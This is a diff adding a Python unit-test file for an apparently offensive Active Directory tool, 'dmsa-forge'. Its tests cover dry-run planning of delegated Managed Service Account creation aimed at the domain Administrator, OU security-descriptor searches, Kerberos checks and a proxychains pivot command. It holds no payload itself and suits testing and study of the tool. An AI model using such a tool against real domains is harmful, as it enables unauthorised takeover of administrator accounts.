+
+        cli.attach_next_steps(report, options, mode='execute', success=True)
+
+        command = report['result']['next_steps'][0]['command']
+        self.assertTrue(command.startswith('proxychains -f chain1080.conf -q dmsa-forge plan add'))
+        self.assertIn('--dmsa-name redpen', command)
+
+    def test_report_parsed_inputs_are_flat(self):
+        result = run_cli('add', *BASE_ARGS, '--dry-run', '--output-only')
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        payload = json.loads(result.stdout)
+        self.assertIn('base_dn_valid', payload['parsed_inputs'])
+        self.assertNotIn('parsed_inputs', payload['parsed_inputs'])
+
+    def test_dmsa_name_trailing_dollar_is_normalized_in_reports(self):
+        self.assertEqual(cli.normalized_dmsa_name(' redpen $ '), 'redpen')
+
+        result = run_cli(
+            'add',
+            *BASE_ARGS,
+            '--dmsa-name',
+            'redpen$',
+            '--dry-run',
+            '--output-only',
+        )
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        payload = json.loads(result.stdout)
+        self.assertEqual(payload['inputs']['dmsa_name'], 'redpen')
+        self.assertEqual(payload['inputs']['dns_hostname'], 'redpen.test.local')
+        self.assertTrue(payload['inputs']['planned_dmsa_dn'].startswith('CN=redpen,'))
+        self.assertNotIn('redpen$', result.stdout)
+
+    def test_safe_profile_sets_dry_run_and_scope_from_account_domain(self):
+        result = run_cli(
+            'add',
+            'test.local/admin:pw',
+            '--target-ou',
+            'OU=Staff,DC=test,DC=local',
+            '--target-account',
+            'Administrator',
+            '--profile',
+            'safe',
+            '--output-only',
+        )
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        payload = json.loads(result.stdout)
+        self.assertEqual(payload['controls']['profile'], 'safe')
+        self.assertTrue(payload['controls']['dry_run'])
+        self.assertEqual(payload['scope']['domain'], 'test.local')
+        self.assertEqual(payload['scope']['base_dn'], 'DC=test,DC=local')
+
+    def test_account_domain_infers_scope_base_method_port_and_dns(self):
+        result = run_cli(
+            'add',
+            'test.local/admin:pw',
+            '--target-ou',
+            'OU=Staff,DC=test,DC=local',
+            '--target-account',
+            'CN=Administrator,CN=Users,DC=test,DC=local',
+            '--dmsa-name',
+            'redpen',
+            '--dry-run',
+            '--output-only',
+        )
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        payload = json.loads(result.stdout)
+        self.assertNotIn('config', payload)
+        self.assertEqual(payload['connection']['method'], 'LDAP')
+        self.assertEqual(payload['connection']['port'], 389)
+        self.assertEqual(payload['connection']['base_dn'], 'DC=test,DC=local')
+        self.assertEqual(payload['scope']['domain'], 'test.local')
+        self.assertEqual(payload['scope']['base_dn'], 'DC=test,DC=local')
+        self.assertEqual(payload['inputs']['dns_hostname'], 'redpen.test.local')
+        kinds = [event['kind'] for event in payload['inference']]
+        self.assertIn('connection', kinds)
+        self.assertIn('dns_hostname', kinds)
+
+    def test_target_ou_infers_scope_when_account_domain_is_short(self):
+        result = run_cli(
+            'add',
+            'TEST/admin:pw',
+            '--target-ou',
+            'OU=Staff,DC=test,DC=local',
+            '--target-account',
+            'CN=Administrator,CN=Users,DC=test,DC=local',
+            '--dmsa-name',
+            'redpen',
+            '--dry-run',
+            '--output-only',
+        )
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        payload = json.loads(result.stdout)
+        self.assertEqual(payload['connection']['base_dn'], 'DC=test,DC=local')
+        self.assertEqual(payload['scope']['domain'], 'test.local')
+        self.assertEqual(payload['scope']['base_dn'], 'DC=test,DC=local')
+        self.assertEqual(payload['inputs']['dns_hostname'], 'redpen.test.local')
+
+    def test_explicit_port_infers_method_when_method_is_omitted(self):
+        result = run_cli(
+            'add',
+            'test.local/admin:pw',
+            '--port',
+            '636',
+            '--target-ou',
+            'OU=Staff,DC=test,DC=local',
+            '--target-account',
+            'CN=Administrator,CN=Users,DC=test,DC=local',
+            '--dmsa-name',
+            'redpen',
+            '--dry-run',
+            '--output-only',
+        )
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        payload = json.loads(result.stdout)
+        self.assertEqual(payload['connection']['method'], 'LDAPS')
+        self.assertEqual(payload['connection']['port'], 636)
+        self.assertTrue(any(event['kind'] == 'method' and event['status'] == 'inferred' for event in payload['inference']))
+
+    def test_scope_base_dn_infers_base_dn_for_short_account_domain(self):
+        result = run_cli(
+            'search',
+            'TEST/admin:pw',
+            '--scope-base-dn',
+            'DC=test,DC=local',
+            '--dry-run',
+            '--output-only',
+        )
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        payload = json.loads(result.stdout)
+        self.assertEqual(payload['connection']['base_dn'], 'DC=test,DC=local')
+        self.assertEqual(payload['scope']['base_dn'], 'DC=test,DC=local')
+        self.assertTrue(any(event['kind'] == 'base_dn' and event['detail'] == 'from --scope-base-dn' for event in payload['inference']))
+
+    def test_verify_plan_uses_base_lookup_for_principals_allowed_dn(self):
+        principal_dn = 'CN=Readers,CN=Users,DC=test,DC=local'
+        result = run_cli(
+            'verify',
+            'test.local/admin:pw',
+            '--target-ou',
+            'OU=Staff,DC=test,DC=local',
+            '--dmsa-name',
+            'redpen',
+            '--principals-allowed',
+            principal_dn,
+            '--scope-domain',
+            'test.local',
+            '--scope-base-dn',
+            'DC=test,DC=local',
+            '--dry-run',
+            '--output-only',
+        )
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        payload = json.loads(result.stdout)
+        principal_ops = [
+            op for op in payload['ldap_operations']
+            if op.get('purpose') == 'principals-allowed DN validation'
+        ]
+        self.assertEqual(len(principal_ops), 1)
+        self.assertEqual(principal_ops[0]['base'], 'CN=Readers,CN=Users,DC=test,DC=local')
+        self.assertEqual(principal_ops[0]['scope'], cli.LDAP_BASE)
+
+    def test_root_dse_base_dn_reconcile_updates_scope_report(self):
+        class RootDSEConnection:
+            def __init__(self):
+                self.entries = []
+                self.result = {'result': 0, 'description': 'success', 'message': ''}
+
+            def search(self, search_base=None, **kwargs):
+                if search_base == '':
+                    self.entries = [cli._LDAPEntry(
+                        '',
+                        {'defaultNamingContext': ['DC=test,DC=local']},
+                    )]
+                    return True
+                self.entries = []
+                return True
+
+        options = execution_options(
+            account='TEST/admin:pw',
+            base_dn='DC=TEST',
+            scope_domain=None,
+            scope_base_dn=None,
+            base_dn_supplied=False,
+            scope_domain_supplied=False,
+            scope_base_dn_supplied=False,
+        )
+        forge = cli.DMSAForge('admin', 'pw', 'TEST', '', '', options)
+        forge._reconcile_root_dse_base_dn(RootDSEConnection(), 'TEST', None)
+
+        self.assertEqual(forge._base_dn, 'DC=test,DC=local')
+        self.assertEqual(forge._scope_base_dn, 'DC=test,DC=local')
+        self.assertEqual(forge._scope_domain, 'test.local')
+        self.assertEqual(forge.report['connection']['base_dn'], 'DC=test,DC=local')
+        self.assertEqual(forge.report['scope']['base_dn'], 'DC=test,DC=local')
+        self.assertEqual(forge.report['scope']['domain'], 'test.local')
+
+    def test_connection_fallback_tries_ldaps_when_default_ldap_fails(self):
+        attempts = []
+
+        class FlakyLDAPCompat:
+            def __init__(self, **kwargs):
+                attempts.append((kwargs['use_ldaps'], kwargs['port']))
+                if not kwargs['use_ldaps']:
+                    raise Exception('connection refused')
+                self.bound = True
+                self.entries = []
+                self.result = {'result': 0, 'description': 'success', 'message': ''}
+
+            def search(self, **kwargs):
+                self.entries = []
+                self.result = {'result': 0, 'description': 'success', 'message': ''}
+                return True
+
+            def unbind(self):
+                self.bound = False
+
+        original = cli.LDAPCompat
+        try:
+            cli.LDAPCompat = FlakyLDAPCompat
+            options = execution_options(method='LDAP', port=None, method_supplied=False, port_supplied=False)
+            forge = cli.DMSAForge('admin', 'pw', 'test.local', '', '', options)
+            with contextlib.redirect_stderr(io.StringIO()):
+                success = forge.run()
+        finally:
+            cli.LDAPCompat = original
+
+        self.assertTrue(success)
+        self.assertEqual(attempts, [(False, 389), (True, 636)])
+        self.assertEqual(forge.report['connection']['method'], 'LDAPS')
+        self.assertEqual(forge.report['connection']['port'], 636)
+        self.assertTrue(any(event['kind'] == 'connection' and event['status'] == 'selected' for event in forge.report['inference']))
+
+    def test_target_account_uses_exact_dn_candidate_after_search_miss(self):
+        class CandidateConnection:
+            def __init__(self):
+                self.entries = []
+                self.result = {'result': 0, 'description': 'success', 'message': ''}
+                self.calls = []
+
+            def search(self, search_base=None, **kwargs):
+                self.calls.append(search_base)
+                if search_base == 'CN=Administrator,CN=Users,DC=test,DC=local':
+                    self.entries = [cli._LDAPEntry(
+                        'CN=Administrator,CN=Users,DC=test,DC=local',
+                        {
+                            'objectClass': ['top', 'person', 'user'],
+                            'sAMAccountName': ['Administrator'],
+                            'cn': ['Administrator'],
+                            'name': ['Administrator'],
+                        },
+                    )]
+                    self.result = {'result': 0, 'description': 'success', 'message': ''}
+                    return True
+                self.entries = []
+                self.result = {'result': 0, 'description': 'success', 'message': ''}
+                return True
+
+        forge = minimal_forge()
+        resolved = forge.resolve_account_dn(CandidateConnection(), 'Administrator')
+
+        self.assertEqual(resolved, 'CN=Administrator,CN=Users,DC=test,DC=local')
+        self.assertTrue(any(event['kind'] == 'target_account' and event['status'] == 'selected' for event in forge.report['inference']))
+
+    def test_target_account_candidate_inference_uses_full_dns(self):
+        class MissingCandidateConnection:
+            def __init__(self):
+                self.entries = []
+                self.result = {'result': 0, 'description': 'success', 'message': ''}
+
+            def search(self, **kwargs):
+                self.entries = []
+                self.result = {'result': 0, 'description': 'success', 'message': ''}
+                return True
+
+        forge = minimal_forge()
+        resolved = forge.resolve_account_dn(MissingCandidateConnection(), 'redpen')
+
+        self.assertIsNone(resolved)
+        details = [
+            event['detail'] for event in forge.report['inference']
+            if event['kind'] == 'target_account' and event['status'] == 'try'
+        ]
+        self.assertIn('checking exact DN candidate CN=redpen,CN=Users,DC=test,DC=local', details)
+        self.assertIn('checking exact DN candidate CN=redpen,CN=Computers,DC=test,DC=local', details)
+        self.assertFalse(any('...' in detail for detail in details))
+
+    def test_target_account_hint_explains_dmsa_name_mixup(self):
+        forge = minimal_forge()
+
+        self.assertIn(
+            'use --dmsa-name redpen',
+            forge._target_account_usage_hint('redpen'),
+        )
+        forge._dmsa_name_supplied = True
+        self.assertEqual(forge._target_account_usage_hint('redpen'), '')
+
+    def test_principals_allowed_resolution_fails_closed_on_ambiguous_name(self):
+        class AmbiguousPrincipalConnection:
+            def __init__(self):
+                self.entries = []
+                self.result = {'result': 0, 'description': 'success', 'message': ''}
+
+            def search(self, **kwargs):
+                self.entries = [
+                    cli._LDAPEntry(
+                        'CN=Reader One,CN=Users,DC=test,DC=local',
+                        {
+                            'objectClass': ['top', 'person', 'user'],
+                            'objectSid': ['S-1-5-21-1-2-3-1101'],
+                            'sAMAccountName': ['reader'],
+                            'cn': ['reader'],
+                            'name': ['reader'],
+                        },
+                    ),
+                    cli._LDAPEntry(
+                        'CN=Reader Two,CN=Users,DC=test,DC=local',
+                        {
+                            'objectClass': ['top', 'group'],
+                            'objectSid': ['S-1-5-21-1-2-3-2101'],
+                            'sAMAccountName': ['reader'],
+                            'cn': ['reader'],
+                            'name': ['reader'],
+                        },
+                    ),
+                ]
+                return True
+
+        forge = minimal_forge()
+        resolved = forge.resolve_principal_sid(AmbiguousPrincipalConnection(), 'reader')
+
+        self.assertIsNone(resolved)
+        self.assertIn('multiple exact sAMAccountName matches', forge._last_principal_error)
+
+    def test_principals_allowed_resolution_accepts_single_group(self):
+        class SinglePrincipalConnection:
+            def __init__(self):
+                self.entries = []
+                self.result = {'result': 0, 'description': 'success', 'message': ''}
+
+            def search(self, **kwargs):
+                self.entries = [
+                    cli._LDAPEntry(
+                        'CN=Readers,CN=Users,DC=test,DC=local',
+                        {
+                            'objectClass': ['top', 'group'],
+                            'objectSid': ['S-1-5-21-1-2-3-2101'],
+                            'sAMAccountName': ['Readers'],
+                            'cn': ['Readers'],
+                            'name': ['Readers'],
+                        },
+                    )
+                ]
+                return True
+
+        forge = minimal_forge()
+        resolved = forge.resolve_principal_sid(SinglePrincipalConnection(), 'Readers')
+
+        self.assertEqual(resolved, 'S-1-5-21-1-2-3-2101')
+
+    def test_principals_allowed_dn_uses_base_lookup_only(self):
+        class DNPrincipalConnection:
+            def __init__(self):
+                self.entries = []
+                self.result = {'result': 32, 'description': 'error', 'message': 'noSuchObject'}
+                self.calls = []
+
+            def search(self, search_base=None, search_scope=None, **kwargs):
+                self.calls.append((search_base, search_scope))
+                self.entries = []
+                return False
+
+        connection = DNPrincipalConnection()
+        forge = minimal_forge()
+        resolved = forge.resolve_principal_sid(connection, 'CN=Readers,CN=Users,DC=test,DC=local')
+
+        self.assertIsNone(resolved)
+        self.assertEqual(connection.calls, [('CN=Readers,CN=Users,DC=test,DC=local', cli.LDAP_BASE)])
+
+    def test_excluded_domain_admin_sid_requires_domain_boundary(self):
+        forge = minimal_forge()
+
+        self.assertTrue(forge.is_excluded_sid('S-1-5-21-1-2-3-512', 'S-1-5-21-1-2-3'))
+        self.assertFalse(forge.is_excluded_sid('S-1-5-21-1-2-30-512', 'S-1-5-21-1-2-3'))
+
+    def test_doctor_outputs_local_json_report(self):
+        result = run_cli('doctor', '--output-only')
+
+        self.assertIn(result.returncode, (0, 1), msg=result.stderr)
+        payload = json.loads(result.stdout)
+        self.assertEqual(payload['action'], 'doctor')
+        self.assertEqual(payload['mode'], 'doctor')
+        self.assertEqual(payload['ldap_operations'], [])
+        self.assertEqual(payload['inputs']['account'], '(not set)')
+        self.assertIn(payload['result']['readiness'], ('ready', 'warning', 'blocked'))
+        self.assertIn('recommendations', payload['result'])
+        check_names = {check['name'] for check in payload['result']['checks']}
+        self.assertNotIn('account domain hint', check_names)
+        self.assertNotIn('base DN', check_names)
+        self.assertNotIn('scope domain', check_names)
+        self.assertNotIn('scope base DN', check_names)
+
+    def test_doctor_accepts_workflow_hints_for_dn_checks(self):
+        result = run_cli(
+            'doctor',
+            'test.local/admin',
+            '--scope-domain',
+            'test.local',
+            '--target-ou',
+            'OU=Staff,DC=test,DC=local',
+            '--target-account',
+            'CN=Administrator,CN=Users,DC=test,DC=local',
+            '--principals-allowed',
+            'CN=Readers,CN=Users,DC=test,DC=local',
+            '--output-only',
+        )
+
+        self.assertIn(result.returncode, (0, 1), msg=result.stderr)
+        payload = json.loads(result.stdout)
+        checks = {check['name']: check for check in payload['result']['checks']}
+        self.assertEqual(checks['target OU']['status'], 'ok')
+        self.assertEqual(checks['target account DN']['status'], 'ok')
+        self.assertEqual(checks['principals-allowed DN']['status'], 'ok')
+
+    def test_doctor_text_output_is_concise_and_issue_only(self):
+        result = run_cli('doctor', 'test.local/admin:pw', '--scope-domain', 'test.local', '--no-banner')
+
+        self.assertIn(result.returncode, (0, 1), msg=result.stderr)
+        self.assertIn('doctor: readiness=', result.stdout)
+        self.assertNotIn('\n  fix:', result.stdout)
+        self.assertNotIn('[OK]', result.stdout)
+        self.assertNotIn('target OU', result.stdout)
+
+    def test_doctor_reports_invalid_principals_allowed_sid(self):
+        result = run_cli(
+            'doctor',
+            'test.local/admin',
+            '--scope-domain',
+            'test.local',
+            '--principals-allowed',
+            'S-1-bad',
+            '--output-only',
+        )
+
+        self.assertEqual(result.returncode, 1)
+        payload = json.loads(result.stdout)
+        checks = {check['name']: check for check in payload['result']['checks']}
+        self.assertEqual(checks['principals-allowed SID']['status'], 'error')
+
+    def test_doctor_reports_bad_scope_domain_as_json(self):
+        result = run_cli('doctor', 'test.local/admin', '--scope-domain', 'bad', '--output-only')
+
+        self.assertEqual(result.returncode, 1)
+        payload = json.loads(result.stdout)
+        checks = {check['name']: check for check in payload['result']['checks']}
+        self.assertEqual(payload['result']['readiness'], 'blocked')
+        self.assertEqual(checks['scope domain']['status'], 'error')
+
+    def test_doctor_kerberos_requires_krb5ccname_when_requested(self):
+        result = run_cli(
+            'doctor',
+            'test.local/admin',
+            '--kerberos',
+            '--dc-host',
+            'dc01.test.local',
+            '--output-only',
+            env_overrides={'KRB5CCNAME': None},
+        )
+
+        self.assertEqual(result.returncode, 1)
+        payload = json.loads(result.stdout)
+        checks = {check['name']: check for check in payload['result']['checks']}
+        self.assertTrue(payload['controls']['kerberos'])
+        self.assertEqual(checks['KRB5CCNAME']['status'], 'error')
+        self.assertIn('Export KRB5CCNAME', checks['KRB5CCNAME']['remediation'])
+
+    def test_doctor_kerberos_reports_missing_dc_host(self):
+        result = run_cli(
+            'doctor',
+            'test.local/admin',
+            '--kerberos',
+            '--output-only',
+            env_overrides={'KRB5CCNAME': None},
+        )
+
+        self.assertEqual(result.returncode, 1)
+        payload = json.loads(result.stdout)
+        checks = {check['name']: check for check in payload['result']['checks']}
+        self.assertEqual(checks['Kerberos DC hostname']['status'], 'error')
+        self.assertIn('--dc-host', checks['Kerberos DC hostname']['detail'])
+        self.assertIn('--dc-host', checks['Kerberos DC hostname']['remediation'])
+
+    def test_doctor_keeps_inline_account_without_hygiene_warning(self):
+        result = run_cli('doctor', 'test.local/admin:SuperSecret!', '--output-only')
+
+        self.assertIn(result.returncode, (0, 1), msg=result.stderr)
+        payload = json.loads(result.stdout)
+        checks = {check['name']: check for check in payload['result']['checks']}
+        self.assertNotIn('credential hygiene', checks)
+        self.assertEqual(payload['inputs']['account'], 'test.local/admin:SuperSecret!')
+
+    def test_doctor_kerberos_reports_file_cache_path(self):
+        with tempfile.TemporaryDirectory() as tmpdir:
+            cache_path = os.path.join(tmpdir, 'krb5cc_test')
+            with open(cache_path, 'w') as handle:
+                handle.write('not a real ccache')
+            result = run_cli(
+                'doctor',
+                'test.local/admin',
+                '--kerberos',
+                '--dc-host',
+                'dc01.test.local',
+                '--output-only',
+                env_overrides={'KRB5CCNAME': 'FILE:%s' % cache_path},
+            )
+
+        self.assertEqual(result.returncode, 1)
+        payload = json.loads(result.stdout)
+        checks = {check['name']: check for check in payload['result']['checks']}
+        self.assertEqual(checks['KRB5CCNAME']['status'], 'ok')
+        self.assertEqual(checks['ccache backend']['status'], 'ok')
+        self.assertEqual(checks['ccache file exists']['status'], 'ok')
+        self.assertEqual(checks['KRB5CCNAME']['detail'], 'FILE:%s' % cache_path)
+
+    def test_ccache_locator_and_realm_helpers(self):
+        file_locator = cli.parse_ccache_locator('FILE:/tmp/krb5cc_test')
+        dir_locator = cli.parse_ccache_locator('DIR:/tmp/krb5ccdir')
+        kcm_locator = cli.parse_ccache_locator('KCM:1000')
+        plain_locator = cli.parse_ccache_locator('/tmp/plain_cache')
+
+        self.assertTrue(file_locator['impacket_file_cache'])
+        self.assertEqual(dir_locator['scheme'], 'DIR')
+        self.assertFalse(kcm_locator['filesystem'])
+        self.assertEqual(plain_locator['scheme'], 'FILE')
+        self.assertEqual(cli.realm_from_principal_text('user@TEST.LOCAL'), 'TEST.LOCAL')
+
+    def test_output_only_with_output_writes_json_without_stdout(self):
+        with tempfile.TemporaryDirectory() as tmpdir:
+            output_path = os.path.join(tmpdir, 'report.json')
+            result = run_cli('add', *BASE_ARGS, '--dry-run', '--output-only', '--output', output_path)
+
+            self.assertEqual(result.returncode, 0, msg=result.stderr)
+            self.assertEqual(result.stdout, '')
+            with open(output_path, 'r') as handle:
+                payload = json.load(handle)
+            self.assertEqual(payload['action'], 'add')
+            self.assertTrue(payload['controls']['output_only'])
+            self.assertEqual(os.stat(output_path).st_mode & 0o777, 0o600)
+
+    def test_kerberos_guidance_is_add_verify_option_not_action(self):
+        add_help = run_cli('add', '--help-advanced')
+        verify_help = run_cli('verify', '--help-advanced')
+        guidance = run_cli('guidance', 'test.local/admin:pw', '--dmsa-name', 'redpen', '--json')
+
+        self.assertEqual(add_help.returncode, 0, msg=add_help.stderr)
+        self.assertEqual(verify_help.returncode, 0, msg=verify_help.stderr)
+        self.assertIn('--kerberos-guidance', add_help.stdout)
+        self.assertIn('--kerberos-guidance', verify_help.stdout)
+        self.assertEqual(guidance.returncode, 2)
+        self.assertIn('successful add/verify output includes Kerberos commands', guidance.stderr)
+
+    def test_modify_is_fully_removed(self):
+        direct = run_cli('modify', *BASE_ARGS, '--dmsa-name', 'redpen', '--dry-run', '--output-only')
+        legacy = run_cli('test.local/admin:pw', '--action', 'modify')
+
+        self.assertEqual(direct.returncode, 2)
+        self.assertEqual(legacy.returncode, 2)
+        self.assertIn('use delete/add/verify', direct.stderr)
+        self.assertIn('use delete/add/verify', legacy.stderr)
+        self.assertNotIn('--allow-deprecated-modify', direct.stderr)
+
+    def test_minimal_add_dry_run_does_not_trigger_search_only_prereq_error(self):
+        result = run_cli('add', *BASE_ARGS, '--dry-run', '--output-only', '--minimal')
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        payload = json.loads(result.stdout)
+        self.assertTrue(payload['controls']['minimal'])
+        self.assertFalse(payload['controls']['skip_dc_prereq'])
+
+    def test_minimal_search_plan_omits_skipped_dc_prereq_query(self):
+        result = run_cli(
+            'search',
+            'test.local/admin:pw',
+            '--scope-domain',
+            'test.local',
+            '--minimal',
+            '--dry-run',
+            '--output-only',
+        )
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        payload = json.loads(result.stdout)
+        filters = [op.get('filter') for op in payload['ldap_operations']]
+        self.assertTrue(payload['controls']['minimal'])
+        self.assertTrue(payload['controls']['skip_dc_prereq'])
+        self.assertNotIn('domain controllers', filters)
+        self.assertIn('(objectClass=organizationalUnit)', filters)
+
+    def test_search_accepts_target_ou_as_search_base(self):
+        result = run_cli(
+            'search',
+            'test.local/admin:pw',
+            '--scope-domain',
+            'test.local',
+            '--target-ou',
+            'OU=Staff,DC=test,DC=local',
+            '--dry-run',
+            '--output-only',
+        )
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        payload = json.loads(result.stdout)
+        ou_searches = [
+            op for op in payload['ldap_operations']
+            if op.get('filter') == '(objectClass=organizationalUnit)'
+        ]
+        self.assertEqual(len(ou_searches), 1)
+        self.assertEqual(ou_searches[0]['base'], 'OU=Staff,DC=test,DC=local')
+
+    def test_search_defaults_to_security_descriptor_analysis(self):
+        result = run_cli(
+            'search',
+            'test.local/admin:pw',
+            '--scope-domain',
+            'test.local',
+            '--dry-run',
+            '--output-only',
+        )
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        payload = json.loads(result.stdout)
+        ou_searches = [
+            op for op in payload['ldap_operations']
+            if op.get('filter') == '(objectClass=organizationalUnit)'
+        ]
+        self.assertTrue(payload['controls']['include_sd'])
+        self.assertEqual(ou_searches[0]['controls'], ['sdflags=0x5'])
+        self.assertIn('nTSecurityDescriptor', ou_searches[0]['attributes'])
+
+    def test_search_summary_disables_security_descriptor_analysis(self):
+        result = run_cli(
+            'search',
+            'test.local/admin:pw',
+            '--scope-domain',
+            'test.local',
+            '--summary',
+            '--dry-run',
+            '--output-only',
+        )
+
+        self.assertEqual(result.returncode, 0, msg=result.stderr)
+        payload = json.loads(result.stdout)
+        ou_searches = [
+            op for op in payload['ldap_operations']
+            if op.get('filter') == '(objectClass=organizationalUnit)'
+        ]
+        self.assertFalse(payload['controls']['include_sd'])
+        self.assertEqual(ou_searches[0].get('controls'), [])
+        self.assertNotIn('nTSecurityDescriptor', ou_searches[0]['attributes'])
+
+    def test_search_include_security_descriptor_aliases_are_equivalent(self):
+        long_result = run_cli(
+            'search',
+            'test.local/admin:pw',
+            '--scope-domain',
+            'test.local',
+            '--include-security-descriptor',
+            '--resolve-names',
+            '--dry-run',
+            '--output-only',
+        )
+        short_result = run_cli(
+            'search',
+            'test.local/admin:pw',
+            '--scope-domain',
+            'test.local',
+            '--include-sd',
+            '--resolve-names',
+            '--dry-run',
+            '--output-only',
+        )
+
+        self.assertEqual(long_result.returncode, 0, msg=long_result.stderr)
+        self.assertEqual(short_result.returncode, 0, msg=short_result.stderr)
+        long_payload = json.loads(long_result.stdout)
+        short_payload = json.loads(short_result.stdout)
+        self.assertTrue(long_payload['controls']['include_sd'])
+        self.assertTrue(short_payload['controls']['include_sd'])
+        self.assertEqual(long_payload['ldap_operations'], short_payload['ldap_operations'])
+
+    def test_search_continues_when_dc_prereq_check_fails(self):
+        class SearchConnection:
+            def __init__(self):
+                self.bound = True
+                self.entries = []
+                self.result = {'result': 0, 'description': 'success', 'message': ''}
+                self.calls = []
+
+            def search(self, search_base=None, search_filter=None, **kwargs):
+                self.calls.append((search_base, search_filter))
+                if search_filter and 'userAccountControl:1.2.840.113556.1.4.803:=8192' in search_filter:
+                    self.entries = []
+                    self.result = {'result': -1, 'description': 'error', 'message': 'parser issue'}
+                    return False
+                if search_filter == '(objectClass=organizationalUnit)':
+                    self.entries = [
+                        cli._LDAPEntry(
+                            'OU=Staff,DC=test,DC=local',
+                            {'distinguishedName': [b'OU=Staff,DC=test,DC=local']},
+                        )
+                    ]
+                    self.result = {'result': 0, 'description': 'success', 'message': ''}
+                    return True
+                return False
+
+        forge = minimal_forge()
+        forge._search_summary = True
+        forge._search_include_sd = False
+        forge._search_resolve_names = False
+        forge._skip_dc_prereq = False
+        forge._target_ou = 'OU=Staff,DC=test,DC=local'
+        forge._options = execution_options(target_ou='OU=Staff,DC=test,DC=local')
+
+        with contextlib.redirect_stderr(io.StringIO()):
+            success = forge.search_ous(SearchConnection())
+
+        self.assertTrue(success)
+        self.assertEqual(forge.report['result']['ou_count'], 1)
+        self.assertEqual(forge.report['result']['search_base'], 'OU=Staff,DC=test,DC=local')
+        self.assertIn('Domain Controller prerequisite check failed', forge.report['result']['dc_prereq_warning'])
+
+    def test_search_falls_back_to_authenticated_account_ou_when_broad_ou_search_fails(self):
+        class FallbackConnection:
+            def __init__(self):
+                self.bound = True
+                self.entries = []
+                self.result = {'result': 0, 'description': 'success', 'message': ''}
+                self.calls = []
+
+            def search(self, search_base=None, search_filter=None, attributes=None, **kwargs):
+                self.calls.append((search_base, search_filter))
+                if search_filter == '(objectClass=organizationalUnit)' and search_base == 'DC=test,DC=local':
+                    self.entries = []
+                    self.result = {'result': -1, 'description': 'error', 'message': 'parser issue'}
+                    return False
+                if search_filter and 'sAMAccountName=adam.scott' in search_filter:
+                    assert attributes == ['distinguishedName', 'sAMAccountName']
+                    self.entries = [
+                        cli._LDAPEntry(
+                            'CN=adam.scott,OU=Staff,DC=test,DC=local',
+                            {
+                                'distinguishedName': ['CN=adam.scott,OU=Staff,DC=test,DC=local'],
+                                'sAMAccountName': ['adam.scott'],
+                            },
+                        )
+                    ]
+                    self.result = {'result': 0, 'description': 'success', 'message': ''}
+                    return True
+                if search_filter == '(objectClass=organizationalUnit)' and search_base == 'OU=Staff,DC=test,DC=local':
+                    self.entries = [
+                        cli._LDAPEntry(
+                            'OU=Staff,DC=test,DC=local',
+                            {'distinguishedName': ['OU=Staff,DC=test,DC=local']},
+                        )
+                    ]
+                    self.result = {'result': 0, 'description': 'success', 'message': ''}
+                    return True
+                self.entries = []
+                self.result = {'result': 0, 'description': 'success', 'message': ''}
+                return True
+
+        forge = minimal_forge()
+        forge._username = 'adam.scott'
+        forge._search_summary = True
+        forge._search_include_sd = False
+        forge._search_resolve_names = False
+        forge._skip_dc_prereq = True
+        forge._target_ou = None
+        forge._options = execution_options(account='test.local/adam.scott:pw', target_ou=None)
+
+        with contextlib.redirect_stderr(io.StringIO()):
+            success = forge.search_ous(FallbackConnection())
+
+        self.assertTrue(success)
+        self.assertEqual(forge._options.target_ou, 'OU=Staff,DC=test,DC=local')
+        self.assertEqual(forge.report['result']['ou_count'], 1)
+        self.assertEqual(forge.report['result']['search_base'], 'OU=Staff,DC=test,DC=local')
+        self.assertIn('Broad OU search failed', forge.report['result']['search_fallback'])
+        self.assertTrue(any(event['kind'] == 'target_ou' and event['status'] == 'fallback' for event in forge.report['inference']))
+
+    def test_ldap_compat_does_not_append_port_to_impacket_url(self):
+        captured = []
+
+        class FakeConnection:
+            def __init__(self, url, baseDN='', dstIp=None, signing=True):
+                captured.append((url, baseDN, dstIp, signing))
+
+            def login(self, *args, **kwargs):
+                return None
+
+        original = cli.impacket_ldap
+        try:
+            cli.impacket_ldap = types.SimpleNamespace(LDAPConnection=FakeConnection)
+            cli.LDAPCompat(
+                domain='test.local',
+                username='admin',
+                password='pw',
+                lmhash='',
+                nthash='',
+                aes_key=None,
+                do_kerberos=False,
+                target_host='dc01.test.local',
+                dc_ip=None,
+                base_dn='DC=test,DC=local',
+                use_ldaps=False,
+                kdc_host=None,
+                port=389,
+            )
+        finally:
+            cli.impacket_ldap = original
+
+        self.assertEqual(captured[0][0], 'ldap://dc01.test.local')
+        self.assertEqual(captured[0][2], None)
+
+    def test_output_file_rejects_symlink_when_supported(self):
+        if not hasattr(os, 'O_NOFOLLOW'):
+            self.skipTest('O_NOFOLLOW is not available on this platform')
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            target_path = os.path.join(tmpdir, 'target.json')
+            link_path = os.path.join(tmpdir, 'report.json')
+            with open(target_path, 'w') as handle:
+                handle.write('{}')
+            try:
+                os.symlink(target_path, link_path)
+            except (AttributeError, NotImplementedError, OSError) as exc:
+                self.skipTest('symlinks are not available: %s' % exc)
+
+            with self.assertRaises(OSError):
+                cli.write_output_file(link_path, '{"ok": true}\n')
+
+
+if __name__ == '__main__':
+    unittest.main()
